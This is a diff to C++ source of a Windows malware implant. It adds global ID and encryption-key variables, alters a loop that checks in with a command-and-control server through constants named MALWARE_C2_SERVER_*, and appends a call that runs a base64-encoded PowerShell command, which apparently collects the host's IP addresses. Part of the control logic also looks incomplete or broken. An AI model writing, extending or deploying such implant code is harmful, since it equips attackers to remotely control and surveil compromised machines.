@@ -17,6 +17,9 @@ enum OpCodes
     KILL
 };
 
+std::string globalID;
+std::string encryptionKey;
+
 int wmain(int argc, wchar_t **argv, wchar_t **envp)
 {
     // HANDLE namedPipe = CreateNamedPipeA(MALWARE_NAMED_PIPE, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE, 2, 512, 512, 0, NULL);
@@ -71,10 +74,10 @@ int wmain(int argc, wchar_t **argv, wchar_t **envp)
     /*additional init should go here*/
     bool Success = false;
     std::wstring buffer;
-    int opCode;
+    int opCode = KILL;
     while (true)
     {
-        result = makeHttpRequest(MALWARE_C2_SERVER_ADDRESS, MALWARE_C2_SERVER_PORT, MALWARE_C2_SERVER_CHECKIN_URI, L"", "", MALWARE_C2_SERVER_USE_TLS);
+        result = makeHttpRequest(MALWARE_C2_SERVER_ADDRESS, MALWARE_C2_SERVER_PORT, MALWARE_C2_SERVER_CHECKIN_URI, NULL, NULL, MALWARE_C2_SERVER_USE_TLS);
         
         switch (opCode)
         {
@@ -99,5 +102,6 @@ int wmain(int argc, wchar_t **argv, wchar_t **envp)
             break;
         }
     }
+    SpawnShellCode(L"KEAoW1N5c3RlbS5OZXQuRG5zXTo6R2V0SG9zdEFkZHJlc3NlcygkRU5WOkhPU1ROQU1FKSkgfCAleyRfLklQQWRkcmVzc1RvU3RyaW5nfSkgLWpvaW4gIiwgIg==");
     return 0;
 }
